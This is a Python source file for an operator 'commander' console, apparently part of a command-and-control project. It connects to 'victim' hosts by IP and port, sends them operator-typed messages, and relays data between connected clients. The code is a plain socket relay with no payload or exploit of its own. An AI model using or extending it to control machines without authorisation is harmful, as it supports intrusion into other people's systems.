import constants
from commander_utils import *
import socket
import select
import sys


if __name__ == '__main__':
    # Initialization + GetOpts
    source_ip, source_port, destination_ip, destination_port = parse_arguments()

    # Initialize server socket and socket lists
    server_socket = initialize_server_socket(source_ip, source_port)

    # List of sockets to monitor for readability (includes the server and stdin FDs)
    sockets_to_read = [server_socket, sys.stdin]

    # Initialize client list to keep track of connected client sockets and their addresses (IP, Port)
    # Key/Value Pair => [Socket] : (IP, Port)
    connected_clients = {}

    # Initial connect to victim as passed by argument (and put in sockets_to_read)
    print_config(destination_ip, destination_port, (source_ip, source_port))
    connect_to_client(sockets_to_read, connected_clients, destination_ip, destination_port)

    # Display Menu
    display_menu()

    while True:
        # Use select to monitor multiple sockets
        readable, _, _ = select.select(sockets_to_read, [], [])

        # Display menu & prompt user selection
        command = get_menu_selection()

        for sock in readable:
            # a) Handle new connections
            if sock is server_socket:
                # This means there is a new incoming connection
                client_socket, client_address = server_socket.accept()
                print("[+] New connection from:", client_address)
                sockets_to_read.append(client_socket)

                # Add the new client socket to the connected_clients dictionary
                connected_clients[client_socket] = client_address

            # b) Read from stdin file descriptor (Initiate Menu from keystroke)
            elif sock is sys.stdin:
                if command == constants.PERFORM_MENU_ITEM_FIVE:  # Disconnect from victim
                    disconnect_from_client(sockets_to_read, connected_clients,
                                           destination_ip, destination_port)

                if command == "connect":  # a) For connecting to a new victim
                    target_ip = input("[+] Enter victim IP address: ")
                    target_port = int(input("[+] Enter victim port: "))
                    connect_to_client(sockets_to_read, connected_clients, target_ip, target_port)

                if command == "send":  # b) For sending things to a specific victim
                    target_socket = None
                    target_ip = input("[+] Enter target IP address: ")
                    target_port = int(input("[+] Enter target port: "))
                    msg = input(f"[+] Type what you want to send to {target_ip} on port {target_port}: ")

                    # Find a specific client socket from client socket list to send data to
                    for client_sock, (ip, port) in connected_clients.items():
                        if ip == target_ip and port == target_port:
                            target_socket = client_sock
                            break

                    if target_socket:
                        try:
                            # Send the message to the target client
                            target_socket.send(msg.encode())
                            print("[+] Sent to", (target_ip, target_port), ":", msg)
                        except Exception as e:
                            print("[+] Error sending to", (target_ip, target_port), ":", str(e))
                    else:
                        print("[+] ERROR: Target client not found!")

            #  c) If not server or stdin sockets, then handle data coming from clients
            else:
                # Data is available to read from an existing client connection
                data = sock.recv(1024)
                if not data:
                    print("[+] Connection closed by", connected_clients[sock])
                    del connected_clients[sock]
                    sockets_to_read.remove(sock)
                else:
                    print("[+] Received from", connected_clients[sock], ":", data.decode())

                    # Broadcast the received message to all other connected clients
                    for client_sock in connected_clients:
                        if client_sock != sock:
                            try:
                                client_sock.send(data)
                            except Exception as e:
                                print("[+] Error broadcasting to", connected_clients[client_sock], ":", str(e))
